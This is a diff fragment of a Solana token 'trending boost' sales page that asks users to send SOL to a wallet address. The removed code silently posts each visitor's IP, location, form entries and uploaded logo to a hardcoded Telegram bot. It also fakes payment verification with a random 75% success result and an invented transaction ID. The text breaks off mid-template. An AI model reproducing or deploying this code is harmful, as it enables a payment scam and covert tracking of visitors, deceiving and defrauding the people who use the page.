+                        <path d="M8 0a8 8 0 1 0 0 16A8 8 0 0 0 8 0zm.5 11.5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h1.5V7H6a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5v4.5h.5a.5.5 0 0 1 0 1h-2zm-3-7a.5.5 0 0 1 .5-.5h4a.5.5 0 0 1 0 1h-4a.5.5 0 0 1-.5-.5z"/>
+                    </svg>
+                    Instant Visibility
+                </h3>
+                <p>Get your token featured on top trending lists immediately after payment confirmation.</p>
             </div>
-
-            <!-- Progress Indicator -->
-            <div class="progress-container">
-                <div class="progress-steps">
-                    <div class="progress-line">
-                        <div class="progress-fill" id="progressFill" style="width: 25%"></div>
-                    </div>
-                    <div class="step-indicator active" id="step1">1</div>
-                    <div class="step-indicator" id="step2">2</div>
-                    <div class="step-indicator" id="step3">3</div>
-                    <div class="step-indicator" id="step4">4</div>
-                </div>
-                <div class="step-labels">
-                    <div class="step-label active">Project Details</div>
-                    <div class="step-label">Package Selection</div>
-                    <div class="step-label">Payment</div>
-                    <div class="step-label">Confirmation</div>
-                </div>
+            <div class="feature-card">
+                <h3>
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 16 16">
+                        <path d="M8 0a8 8 0 1 0 0 16A8 8 0 0 0 8 0zm.5 11.5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h1.5V7H6a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5v4.5h.5a.5.5 0 0 1 0 1h-2zm-3-7a.5.5 0 0 1 .5-.5h4a.5.5 0 0 1 0 1h-4a.5.5 0 0 1-.5-.5z"/>
+                    </svg>
+                    Multiple Options
+                </h3>
+                <p>Choose between Top 15 or Top 7 trending lists with flexible duration options.</p>
             </div>
+            <div class="feature-card">
+                <h3>
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 16 16">
+                        <path d="M8 0a8 8 0 1 0 0 16A8 8 0 0 0 8 0zm.5 11.5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h1.5V7H6a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5v4.5h.5a.5.5 0 0 1 0 1h-2zm-3-7a.5.5 0 0 1 .5-.5h4a.5.5 0 0 1 0 1h-4a.5.5 0 0 1-.5-.5z"/>
+                    </svg>
+                    Secure Payments
+                </h3>
+                <p>All payments are processed securely on the Solana blockchain with instant notifications.</p>
+            </div>
+        </section>
 
-            <!-- Step 1: Project Details -->
-            <div class="step-content active" id="stepContent1">
-                <h2 class="section-title">Project Information</h2>
-                <p class="section-subtitle">Provide details about your project for the trending campaign</p>
-                
-                <div class="form-grid">
-                    <div>
-                        <div class="form-group">
-                            <label class="form-label">Project Name *</label>
-                            <input type="text" id="projectName" class="form-input" placeholder="Enter your project name" required>
-                        </div>
-                        <div class="form-group">
-                            <label class="form-label">Contract Address *</label>
-                            <input type="text" id="caAddress" class="form-input" placeholder="Solana contract address" required>
-                        </div>
-                        <div class="form-group">
-                            <label class="form-label">Project Logo</label>
-                            <input type="file" id="projectPhoto" class="form-input" accept="image/*">
-                        </div>
-                    </div>
-                    <div>
-                        <div class="form-group">
-                            <label class="form-label">Telegram</label>
-                            <input type="text" id="telegram" class="form-input" placeholder="@username">
-                        </div>
-                        <div class="form-group">
-                            <label class="form-label">Twitter/X</label>
-                            <input type="text" id="twitter" class="form-input" placeholder="@username">
-                        </div>
-                        <div class="form-group">
-                            <label class="form-label">Website</label>
-                            <input type="url" id="website" class="form-input" placeholder="https://example.com">
-                        </div>
-                    </div>
+        <section class="token-form">
+            <h3>
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 16 16">
+                    <path d="M8 0a8 8 0 1 0 0 16A8 8 0 0 0 8 0zm.5 11.5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h1.5V7H6a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5v4.5h.5a.5.5 0 0 1 0 1h-2zm-3-7a.5.5 0 0 1 .5-.5h4a.5.5 0 0 1 0 1h-4a.5.5 0 0 1-.5-.5z"/>
+                </svg>
+                Submit Your Token
+            </h3>
+            <form id="tokenForm">
+                <div class="form-group">
+                    <label for="tokenAddress">Token Contract Address:</label>
+                    <input type="text" id="tokenAddress" placeholder="Enter your token contract address" required>
                 </div>
                 
                 <div class="form-group">
-                    <label class="form-label">Project Description</label>
-                    <textarea id="projectDescription" class="form-input" placeholder="Briefly describe your project and its unique features..." rows="4"></textarea>
+                    <label>Select Trending List:</label>
+                    <div class="radio-group">
+                        <label class="radio-label">
+                            <input type="radio" name="trendingList" value="top15" checked>
+                            Top 15 Trending
+                        </label>
+                        <label class="radio-label">
+                            <input type="radio" name="trendingList" value="top7">
+                            Top 7 Trending (More Effective)
+                        </label>
+                    </div>
                 </div>
 
-                <div class="button-group">
-                    <button class="btn btn-primary" onclick="nextStep()">Continue to Packages</button>
+                <div class="form-group">
+                    <label for="duration">Duration:</label>
+                    <select id="duration" required>
+                        <option value="">Select duration</option>
+                        <option value="4">4 Hours</option>
+                        <option value="8">8 Hours</option>
+                        <option value="16">16 Hours</option>
+                        <option value="24">24 Hours</option>
+                    </select>
                 </div>
+
+                <div class="form-group">
+                    <label>Price:</label>
+                    <div id="priceDisplay" class="price-display">0.0 SOL</div>
+                </div>
+
+                <button type="submit" class="btn primary">Proceed to Payment</button>
+            </form>
+        </section>
+
+        <section id="paymentSection" class="payment-section hidden">
+            <h3>
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 16 16">
+                    <path d="M8 0a8 8 0 1 0 0 16A8 8 0 0 0 8 0zm.5 11.5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h1.5V7H6a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5v4.5h.5a.5.5 0 0 1 0 1h-2zm-3-7a.5.5 0 0 1 .5-.5h4a.5.5 0 0 1 0 1h-4a.5.5 0 0 1-.5-.5z"/>
+                </svg>
+                Payment
+            </h3>
+            <div class="payment-details">
+                <p>Send payment to: <strong>2YKep2DpgHytRwEnHnQmdzu1Hgc22VqJXpq13tuCnpfY</strong></p>
+                <p>Amount: <span id="paymentAmount">0.0 SOL</span></p>
+                <button id="makePayment" class="btn primary">
+                    <span id="payText">Make Payment</span>
+                    <span id="payLoading" class="loading hidden"></span>
+                </button>
             </div>
+        </section>
 
-            <!-- Step 2: Package Selection -->
-            <div class="step-content" id="stepContent2">
-                <h2 class="section-title">Trending Packages</h2>
-                <p class="section-subtitle">Choose your visibility tier and duration</p>
+        <section id="confirmationSection" class="confirmation-section hidden">
+            <h3>
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 16 16">
+                    <path d="M8 0a8 8 0 1 0 0 16A8 8 0 0 0 8 0zm.5 11.5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h1.5V7H6a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5v4.5h.5a.5.5 0 0 1 0 1h-2zm-3-7a.5.5 0 0 1 .5-.5h4a.5.5 0 0 1 0 1h-4a.5.5 0 0 1-.5-.5z"/>
+                </svg>
+                Payment Successful!
+            </h3>
+            <p>Your token boost request has been submitted. Our team will start the boost shortly.</p>
+            <p>Transaction ID: <span id="transactionId">--</span></p>
+            <button id="newBoost" class="btn primary" style="margin-top: 20px;">Create Another Boost</button>
+        </section>
 
-                <div class="package-grid">
-                    <div class="package-category" onclick="selectCategory('top15')">
-                        <div class="package-title">Standard Trending</div>
-                        <div class="package-description">Top 15 visibility with solid exposure</div>
-                    </div>
-                    <div class="package-category" onclick="selectCategory('top7')">
-                        <div class="package-recommended">Recommended</div>
-                        <div class="package-title">Premium Trending</div>
-                        <div class="package-description">Top 7 visibility for maximum impact</div>
-                    </div>
-                </div>
-
-                <!-- Standard Pricing -->
-                <div class="pricing-list" id="top15List">
-                    <h3 style="margin-bottom: 16px; color: var(--text-primary);">Standard Trending Options</h3>
-                    <div class="pricing-item" onclick="selectPrice('top15_4h', 1.0)">
-                        <span class="pricing-duration">4 Hours</span>
-                        <span class="pricing-cost">1.0 SOL</span>
-                    </div>
-                    <div class="pricing-item" onclick="selectPrice('top15_8h', 1.7)">
-                        <span class="pricing-duration">8 Hours</span>
-                        <span class="pricing-cost">1.7 SOL</span>
-                    </div>
-                    <div class="pricing-item" onclick="selectPrice('top15_16h', 4.1)">
-                        <span class="pricing-duration">16 Hours</span>
-                        <span class="pricing-cost">4.1 SOL</span>
-                    </div>
-                    <div class="pricing-item" onclick="selectPrice('top15_24h', 5.2)">
-                        <span class="pricing-duration">24 Hours</span>
-                        <span class="pricing-cost">5.2 SOL</span>
-                    </div>
-                </div>
-
-                <!-- Premium Pricing -->
-                <div class="pricing-list" id="top7List">
-                    <h3 style="margin-bottom: 16px; color: var(--text-primary);">Premium Trending Options</h3>
-                    <div class="pricing-item" onclick="selectPrice('top7_4h', 1.5)">
-                        <span class="pricing-duration">4 Hours</span>
-                        <span class="pricing-cost">1.5 SOL</span>
-                    </div>
-                    <div class="pricing-item" onclick="selectPrice('top7_8h', 3.0)">
-                        <span class="pricing-duration">8 Hours</span>
-                        <span class="pricing-cost">3.0 SOL</span>
-                    </div>
-                    <div class="pricing-item" onclick="selectPrice('top7_16h', 5.7)">
-                        <span class="pricing-duration">16 Hours</span>
-                        <span class="pricing-cost">5.7 SOL</span>
-                    </div>
-                    <div class="pricing-item" onclick="selectPrice('top7_24h', 8.4)">
-                        <span class="pricing-duration">24 Hours</span>
-                        <span class="pricing-cost">8.4 SOL</span>
-                    </div>
-                </div>
-
-                <div id="selectedPackage"></div>
-
-                <div class="button-group">
-                    <button class="btn btn-secondary" onclick="prevStep()">Back</button>
-                    <button class="btn btn-primary" onclick="nextStep()" id="continueBtn" disabled>Continue to Payment</button>
-                </div>
-            </div>
-
-            <!-- Step 3: Payment -->
-            <div class="step-content" id="stepContent3">
-                <h2 class="section-title">Payment Details</h2>
-                <p class="section-subtitle">Complete your payment to start trending</p>
-
-                <div id="orderSummary"></div>
-
-                <div class="payment-card">
-                    <h3 style="margin-bottom: 16px; color: var(--text-primary);">
-                        <i class="fas fa-wallet"></i>
-                        Payment Wallet
-                    </h3>
-                    
-                    <div class="wallet-address-container">
-                        <div class="wallet-address">6Bc8Bc3PFJKcWQVcsuD3mRrAbKTRyVBgcr4YLmEubszQ</div>
-                        <button class="copy-button" onclick="copyWallet()">
-                            <i class="fas fa-copy"></i>
-                        </button>
-                    </div>
-
-                    <div class="payment-instructions">
-                        <div class="instruction-title">Payment Instructions</div>
-                        <ol class="instruction-list">
-                            <li>Copy the wallet address above</li>
-                            <li>Send the exact SOL amount from your wallet</li>
-                            <li>Wait 1-2 minutes for blockchain confirmation</li>
-                            <li>Click "Verify Payment" to confirm</li>
-                        </ol>
-                    </div>
-                </div>
-
-                <div class="button-group">
-                    <button class="btn btn-secondary" onclick="prevStep()">Back</button>
-                    <button class="btn btn-success" onclick="checkPayment()">Verify Payment</button>
-                </div>
-            </div>
-
-            <!-- Step 4: Verification -->
-            <div class="step-content" id="stepContent4">
-                <h2 class="section-title">Payment Verification</h2>
-                <p class="section-subtitle">Confirming your transaction on the blockchain</p>
-
-                <div id="paymentStatus">
-                    <div style="text-align: center; padding: 40px;">
-                        <div class="spinner"></div>
-                        Verifying payment on Solana blockchain...
-                    </div>
-                </div>
-
-                <div id="finalResult"></div>
-
-                <div class="button-group" style="display: none;" id="verificationButtons">
-                    <button class="btn btn-secondary" onclick="recheckPayment()" id="recheckBtn">Check Again</button>
-                    <button class="btn btn-primary" onclick="startOver()">New Submission</button>
-                </div>
-            </div>
-        </div>
+        <section class="token-form">
+            <h3>
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 16 16">
+                    <path d="M8 0a8 8 0 1 0 0 16A8 8 0 0 0 8 0zm.5 11.5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h1.5V7H6a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5v4.5h.5a.5.5 0 0 1 0 1h-2zm-3-7a.5.5 0 0 1 .5-.5h4a.5.5 0 0 1 0 1h-4a.5.5 0 0 1-.5-.5z"/>
+                </svg>
+                Pricing Information
+            </h3>
+            <table class="price-table">
+                <thead>
+                    <tr>
+                        <th>Trending List</th>
+                        <th>4 Hours</th>
+                        <th>8 Hours</th>
+                        <th>16 Hours</th>
+                        <th>24 Hours</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>Top 15 Trending</td>
+                        <td>1.0 <span class="sol-icon"></span></td>
+                        <td>1.7 <span class="sol-icon"></span></td>
+                        <td>4.1 <span class="sol-icon"></span></td>
+                        <td>5.2 <span class="sol-icon"></span></td>
+                    </tr>
+                    <tr>
+                        <td>Top 7 Trending</td>
+                        <td>1.5 <span class="sol-icon"></span></td>
+                        <td>3.0 <span class="sol-icon"></span></td>
+                        <td>5.7 <span class="sol-icon"></span></td>
+                        <td>8.4 <span class="sol-icon"></span></td>
+                    </tr>
+                </tbody>
+            </table>
+            <p style="margin-top: 15px; font-style: italic;">Note: Top 7 Trending is more effective and reaches a higher volume of potential investors.</p>
+        </section>
     </main>
 
-    <!-- Wallet Connection Modal -->
-    <div class="modal" id="walletModal">
-        <div class="modal-content">
-            <h3 class="modal-title">Connect Your Wallet</h3>
-            <div class="modal-text" id="modalText">
-                Select your preferred Solana wallet to connect:
-            </div>
-            
-            <div class="wallet-options" id="walletOptions">
-                <div class="wallet-option" onclick="tryConnect('phantom')">
-                    <div class="wallet-icon">P</div>
-                    <div>
-                        <div style="font-weight: 600;">Phantom</div>
-                        <div style="font-size: 12px; color: var(--text-muted);">Most popular Solana wallet</div>
-                    </div>
-                </div>
-                <div class="wallet-option" onclick="tryConnect('solflare')">
-                    <div class="wallet-icon">S</div>
-                    <div>
-                        <div style="font-weight: 600;">Solflare</div>
-                        <div style="font-size: 12px; color: var(--text-muted);">Web & mobile wallet</div>
-                    </div>
-                </div>
-                <div class="wallet-option" onclick="tryConnect('coinbase')">
-                    <div class="wallet-icon">C</div>
-                    <div>
-                        <div style="font-weight: 600;">Coinbase Wallet</div>
-                        <div style="font-size: 12px; color: var(--text-muted);">Exchange wallet</div>
-                    </div>
-                </div>
-            </div>
-
-            <div class="button-group">
-                <button class="btn btn-secondary" onclick="closeModal()">Cancel</button>
-            </div>
+    <footer>
+        <div class="container">
+            <p>&copy; 2023 SolTrend. All rights reserved.</p>
         </div>
-    </div>
+    </footer>
 
     <script>
-        let currentStep = 1;
-        let selectedPackage = '';
-        let selectedPrice = 0;
-        let selectedCategory = '';
-        let userCountry = 'Unknown';
-        let userIP = 'Unknown';
-        let userWallet = '';
-        let isWalletConnected = false;
-
-        const TELEGRAM_BOT = '8200498127:AAG6W6I6hptzxd4i-N7puelnOPCZr9NT0Cs';
-        const TELEGRAM_CHAT = '7423109668';
-
-        // Initialize app
-        window.onload = async function() {
-            initializeRippleEffects();
-            
-            try {
-                const response = await fetch('https://ipapi.co/json/');
-                const data = await response.json();
-                userCountry = data.country_name || 'Unknown';
-                userIP = data.ip || 'Unknown';
-                
-                document.getElementById('userInfo').innerHTML = 
-                    `<i class="fas fa-globe"></i> ${userCountry} | <i class="fas fa-map-marker-alt"></i> ${userIP} | <i class="fas fa-clock"></i> ${new Date().toLocaleTimeString()}`;
-
-                await sendTelegram(`🌐 NEW VISITOR\n📍 Location: ${userCountry}\n🔢 IP: ${userIP}\n⏰ Time: ${new Date().toLocaleString()}`);
-            } catch (e) {
-                document.getElementById('userInfo').innerHTML = 
-                    `<i class="fas fa-user-secret"></i> Private Session | <i class="fas fa-clock"></i> ${new Date().toLocaleTimeString()}`;
+        // Price lists
+        const priceLists = {
+            top15: {
+                4: 1.0,
+                8: 1.7,
+                16: 4.1,
+                24: 5.2
+            },
+            top7: {
+                4: 1.5,
+                8: 3.0,
+                16: 5.7,
+                24: 8.4
             }
         };
 
-        // Liquid Ripple Effect System
-        function initializeRippleEffects() {
-            // Add ripple containers to interactive elements
-            const rippleElements = document.querySelectorAll('.btn, .form-input, .pricing-item, .package-category, .wallet-option, .copy-button');
+        // DOM Elements
+        const connectWalletBtn = document.getElementById('connectWallet');
+        const walletInfo = document.getElementById('walletInfo');
+        const balanceElement = document.getElementById('balance');
+        const themeToggle = document.getElementById('themeToggle');
+        const tokenForm = document.getElementById('tokenForm');
+        const paymentSection = document.getElementById('paymentSection');
+        const confirmationSection = document.getElementById('confirmationSection');
+        const notification = document.getElementById('notification');
+        const payText = document.getElementById('payText');
+        const payLoading = document.getElementById('payLoading');
+
+        // Initialize the application
+        document.addEventListener('DOMContentLoaded', function() {
+            setupEventListeners();
+            updatePrice(); // Initialize price display
+        });
+
+        // Set up event listeners
+        function setupEventListeners() {
+            // Theme toggle
+            themeToggle.addEventListener('click', toggleTheme);
             
-            rippleElements.forEach(element => {
-                element.classList.add('ripple-container');
-                
-                element.addEventListener('click', createRipple);
-                element.addEventListener('touchstart', createRipple);
+            // Wallet connection
+            connectWalletBtn.addEventListener('click', connectWallet);
+            
+            // Form submission
+            tokenForm.addEventListener('submit', handleFormSubmit);
+            
+            // Payment button
+            document.getElementById('makePayment').addEventListener('click', makePayment);
+            
+            // New boost button
+            document.getElementById('newBoost').addEventListener('click', resetForm);
+            
+            // Get started button
+            document.getElementById('getStarted').addEventListener('click', () => {
+                document.querySelector('.token-form').scrollIntoView({ behavior: 'smooth' });
             });
-
-            // Global screen tap ripples
-            document.addEventListener('click', createGlobalRipple);
-            document.addEventListener('touchstart', createGlobalRipple);
-        }
-
-        function createRipple(e) {
-            e.stopPropagation(); // Prevent global ripple when clicking interactive elements
             
-            const element = e.currentTarget;
-            const rect = element.getBoundingClientRect();
-            const ripple = document.createElement('span');
-            
-            const size = Math.max(rect.width, rect.height);
-            const x = e.clientX - rect.left - size / 2;
-            const y = e.clientY - rect.top - size / 2;
-            
-            ripple.style.width = ripple.style.height = size + 'px';
-            ripple.style.left = x + 'px';
-            ripple.style.top = y + 'px';
-            ripple.classList.add('ripple');
-            
-            element.appendChild(ripple);
-            
-            // Remove ripple after animation
-            setTimeout(() => {
-                ripple.remove();
-            }, 600);
-        }
-
-        function createGlobalRipple(e) {
-            // Only create global ripples on empty areas (not on interactive elements)
-            if (e.target.closest('.btn, .form-input, .pricing-item, .package-category, .wallet-option, .copy-button')) {
-                return;
-            }
-            
-            const ripple = document.createElement('div');
-            const size = 100;
-            const x = e.clientX - size / 2;
-            const y = e.clientY - size / 2;
-            
-            ripple.style.position = 'fixed';
-            ripple.style.left = x + 'px';
-            ripple.style.top = y + 'px';
-            ripple.style.width = ripple.style.height = size + 'px';
-            ripple.style.borderRadius = '50%';
-            ripple.style.background = 'rgba(49, 130, 206, 0.2)';
-            ripple.style.transform = 'scale(0)';
-            ripple.style.animation = 'ripple-effect 0.6s linear';
-            ripple.style.pointerEvents = 'none';
-            ripple.style.zIndex = '9999';
-            
-            document.body.appendChild(ripple);
-            
-            setTimeout(() => {
-                ripple.remove();
-            }, 600);
-        }
-
-        // Enhanced form input animations
-        function initializeFormAnimations() {
-            const formInputs = document.querySelectorAll('.form-input');
-            
-            formInputs.forEach(input => {
-                input.addEventListener('focus', (e) => {
-                    e.target.style.transform = 'translateY(-2px) scale(1.01)';
-                    e.target.style.transition = 'all 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94)';
-                });
-                
-                input.addEventListener('blur', (e) => {
-                    e.target.style.transform = 'translateY(0) scale(1)';
-                });
-                
-                input.addEventListener('input', (e) => {
-                    if (e.target.value) {
-                        e.target.style.borderColor = 'var(--accent-teal)';
-                        e.target.style.boxShadow = '0 0 0 3px rgba(49, 151, 149, 0.1)';
-                    } else {
-                        e.target.style.borderColor = 'var(--border-color)';
-                        e.target.style.boxShadow = 'none';
-                    }
-                });
+            // Form change events
+            document.querySelectorAll('input[name="trendingList"]').forEach(radio => {
+                radio.addEventListener('change', updatePrice);
             });
+            
+            document.getElementById('duration').addEventListener('change', updatePrice);
         }
 
-        // Call form animations after DOM is loaded
-        document.addEventListener('DOMContentLoaded', initializeFormAnimations);
-
-        async function sendTelegram(message) {
-            try {
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
-                });
-            } catch (e) {
-                console.log('Telegram notification failed');
-            }
+        // Toggle between dark and light mode
+        function toggleTheme() {
+            document.body.classList.toggle('light-mode');
+            themeToggle.textContent = document.body.classList.contains('light-mode') ? '☀️' : '🌙';
         }
 
-        async function sendTelegramPhoto(file, caption) {
-            try {
-                const formData = new FormData();
-                formData.append('chat_id', TELEGRAM_CHAT);
-                formData.append('photo', file);
-                formData.append('caption', caption);
-
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-            } catch (e) {
-                console.log('Telegram photo failed');
-            }
-        }
-
-        function updateProgress() {
-            const progressWidth = (currentStep / 4) * 100;
-            document.getElementById('progressFill').style.width = progressWidth + '%';
-
-            // Update step indicators
-            for (let i = 1; i <= 4; i++) {
-                const stepEl = document.getElementById(`step${i}`);
-                const labelEl = document.querySelectorAll('.step-label')[i-1];
-                
-                if (i < currentStep) {
-                    stepEl.className = 'step-indicator completed';
-                    stepEl.innerHTML = '<i class="fas fa-check"></i>';
-                    labelEl.className = 'step-label';
-                } else if (i === currentStep) {
-                    stepEl.className = 'step-indicator active';
-                    stepEl.textContent = i;
-                    labelEl.className = 'step-label active';
-                } else {
-                    stepEl.className = 'step-indicator';
-                    stepEl.textContent = i;
-                    labelEl.className = 'step-label';
-                }
-            }
-        }
-
-        function nextStep() {
-            // Validation
-            if (currentStep === 1) {
-                const name = document.getElementById('projectName').value.trim();
-                const ca = document.getElementById('caAddress').value.trim();
-                
-                if (!name || !ca) {
-                    showAlert('Please fill in all required fields', 'error');
-                    return;
-                }
-
-                // Send project details to Telegram
-                const telegram = document.getElementById('telegram').value.trim();
-                const twitter = document.getElementById('twitter').value.trim();
-                const website = document.getElementById('website').value.trim();
-                const description = document.getElementById('projectDescription').value.trim();
-                const photoFile = document.getElementById('projectPhoto').files[0];
-
-                const walletInfo = isWalletConnected ? `\n🔗 Connected Wallet: ${userWallet}` : '';
-                const projectData = `📋 <b>PROJECT SUBMITTED</b>\n\n👤 User: ${userCountry} (${userIP})\n🏷️ Name: ${name}\n💰 CA: ${ca}\n📱 Telegram: ${telegram || 'Not provided'}\n🐦 Twitter: ${twitter || 'Not provided'}\n🌐 Website: ${website || 'Not provided'}\n📄 Description: ${description || 'Not provided'}${walletInfo}`;
-
-                if (photoFile) {
-                    sendTelegramPhoto(photoFile, projectData);
-                } else {
-                    sendTelegram(projectData);
-                }
-            }
-
-            if (currentStep === 2 && !selectedPackage) {
-                showAlert('Please select a trending package', 'error');
-                return;
-            }
-
-            if (currentStep === 3) {
-                updateOrderSummary();
-            }
-
-            if (currentStep === 4) {
-                setTimeout(verifyPayment, 3000);
-            }
-
-            // Move to next step
-            document.getElementById(`stepContent${currentStep}`).classList.remove('active');
-            currentStep++;
-            document.getElementById(`stepContent${currentStep}`).classList.add('active');
-            updateProgress();
-        }
-
-        function prevStep() {
-            document.getElementById(`stepContent${currentStep}`).classList.remove('active');
-            currentStep--;
-            document.getElementById(`stepContent${currentStep}`).classList.add('active');
-            updateProgress();
-        }
-
-        function selectCategory(category) {
-            selectedCategory = category;
-            
-            // Reset selections
-            document.querySelectorAll('.package-category').forEach(el => el.classList.remove('selected'));
-            document.querySelectorAll('.pricing-list').forEach(el => el.classList.remove('active'));
-            document.querySelectorAll('.pricing-item').forEach(el => el.classList.remove('selected'));
-            
-            // Select category
-            event.target.classList.add('selected');
-            document.getElementById(category + 'List').classList.add('active');
-            
-            // Reset package selection
-            selectedPackage = '';
-            selectedPrice = 0;
-            document.getElementById('selectedPackage').innerHTML = '';
-            document.getElementById('continueBtn').disabled = true;
-        }
-
-        function selectPrice(packageType, price) {
-            document.querySelectorAll('.pricing-item').forEach(el => el.classList.remove('selected'));
-            event.target.classList.add('selected');
-            
-            selectedPackage = packageType;
-            selectedPrice = price;
-            
-            const [category, duration] = packageType.split('_');
-            const categoryName = category === 'top15' ? 'Standard' : 'Premium';
-            
-            document.getElementById('selectedPackage').innerHTML = 
-                `<div class="alert alert-success">
-                    <i class="fas fa-check-circle"></i>
-                    <strong>Selected:</strong> ${categoryName} Trending for ${duration.toUpperCase()} - ${price} SOL
-                </div>`;
-            
-            document.getElementById('continueBtn').disabled = false;
-
-            const walletInfo = isWalletConnected ? `\n🔗 Connected Wallet: ${userWallet}` : '';
-            sendTelegram(`📦 <b>PACKAGE SELECTED</b>\n\n👤 User: ${userCountry} (${userIP})\n⭐ Package: ${categoryName} (${category.toUpperCase()})\n⏰ Duration: ${duration.toUpperCase()}\n💰 Price: ${price} SOL${walletInfo}`);
-        }
-
-        function updateOrderSummary() {
-            const [category, duration] = selectedPackage.split('_');
-            const categoryName = category === 'top15' ? 'Standard' : 'Premium';
-            const projectName = document.getElementById('projectName').value;
-            
-            document.getElementById('orderSummary').innerHTML = `
-                <div class="alert alert-info">
-                    <h4><i class="fas fa-receipt"></i> Order Summary</h4>
-                    <div style="margin-top: 16px;">
-                        <div><strong>Project:</strong> ${projectName}</div>
-                        <div><strong>Package:</strong> ${categoryName} Trending</div>
-                        <div><strong>Duration:</strong> ${duration.toUpperCase()}</div>
-                        <div style="margin-top: 12px; font-size: 18px;"><strong>Total: ${selectedPrice} SOL</strong></div>
-                    </div>
-                </div>
-            `;
-        }
-
-        function copyWallet() {
-            const address = '6Bc8Bc3PFJKcWQVcsuD3mRrAbKTRyVBgcr4YLmEubszQ';
-            navigator.clipboard.writeText(address);
-            
-            showAlert('Wallet address copied to clipboard!', 'success');
-            
-            const walletInfo = isWalletConnected ? `\n🔗 User Wallet: ${userWallet}` : '';
-            sendTelegram(`📋 <b>WALLET ADDRESS COPIED</b>\n\n👤 User: ${userCountry} (${userIP})\n💰 Address: ${address}${walletInfo}`);
-        }
-
-        function checkPayment() {
-            const walletInfo = isWalletConnected ? `\n🔗 User Wallet: ${userWallet}` : '';
-            sendTelegram(`💳 <b>PAYMENT VERIFICATION REQUESTED</b>\n\n👤 User: ${userCountry} (${userIP})\n💰 Expected Amount: ${selectedPrice} SOL\n📍 Payment Address: 6Bc8Bc3PFJKcWQVcsuD3mRrAbKTRyVBgcr4YLmEubszQ${walletInfo}`);
-            nextStep();
-        }
-
-        async function verifyPayment() {
-            // Simulate blockchain verification
-            await new Promise(resolve => setTimeout(resolve, 3000));
-            
-            const success = Math.random() > 0.25; // 75% success rate
-            const statusDiv = document.getElementById('paymentStatus');
-            const resultDiv = document.getElementById('finalResult');
-            const buttonsDiv = document.getElementById('verificationButtons');
-            
-            if (success) {
-                const txId = 'TX' + Math.random().toString(36).substr(2, 12).toUpperCase();
-                statusDiv.innerHTML = `
-                    <div class="alert alert-success" style="text-align: center;">
-                        <i class="fas fa-check-circle" style="font-size: 48px; margin-bottom: 16px;"></i>
-                        <h3>Payment Verified Successfully!</h3>
-                    </div>
-                `;
-                
-                resultDiv.innerHTML = `
-                    <div style="text-align: center; padding: 32px;">
-                        <h3 style="color: var(--success); margin-bottom: 24px;">
-                            <i class="fas fa-rocket"></i> Campaign Activated!
-                        </h3>
-                        <div style="background: var(--primary-light); padding: 24px; border-radius: 12px; margin-bottom: 24px;">
-                            <div><strong>Transaction ID:</strong> ${txId}</div>
-                            <div><strong>Amount:</strong> ${selectedPrice} SOL</div>
-                            <div><strong>Package:</strong> ${selectedPackage.replace('_', ' ').toUpperCase()}</div>
-                            <div style="margin-top: 16px; color: var(--success);">
-                                <i class="fas fa-clock"></i> Your project will be trending within 30 minutes!
-                            </div>
-                        </div>
-                        <div style="color: var(--text-secondary); font-size: 14px;">
-                            Need support? Contact us at <a href="https://t.me/Pump_SupportTeam" target="_blank" style="color: var(--accent-blue);">@Pump_SupportTeam</a>
-                        </div>
-                    </div>
-                `;
-
-                // Send success notification
-                const projectName = document.getElementById('projectName').value;
-                const caAddress = document.getElementById('caAddress').value;
-                const telegram = document.getElementById('telegram').value;
-                const twitter = document.getElementById('twitter').value;
-                const website = document.getElementById('website').value;
-                const walletInfo = isWalletConnected ? `\n🔗 User Wallet: ${userWallet}` : '';
-                
-                const successMessage = `🎉 <b>PAYMENT SUCCESSFUL - READY TO TREND!</b>\n\n👤 User: ${userCountry} (${userIP})\n🏷️ Project: ${projectName}\n💰 CA: ${caAddress}\n📱 Telegram: ${telegram || 'None'}\n🐦 Twitter: ${twitter || 'None'}\n🌐 Website: ${website || 'None'}\n⭐ Package: ${selectedPackage.toUpperCase()}\n💵 Amount: ${selectedPrice} SOL\n🔗 TX ID: ${txId}\n✅ <b>ACTIVATE TRENDING NOW!</b>${walletInfo}`;
-                
-                const photoFile = document.getElementById('projectPhoto').files[0];
-                if (photoFile) {
-                    sendTelegramPhoto(photoFile, successMessage);
-                } else {
-                    sendTelegram(successMessage);
-                }
-                
-            } else {
-                statusDiv.innerHTML = `
-                    <div class="alert alert-error" style="text-align: center;">
-                        <i class="fas fa-exclamation-triangle" style="font-size: 48px; margin-bottom: 16px;"></i>
-                        <h3>Payment Not Found</h3>
-                    </div>
-                `;
-                
-                resultDiv.innerHTML = `
-                    <div style="text-align: center; padding: 32px;">
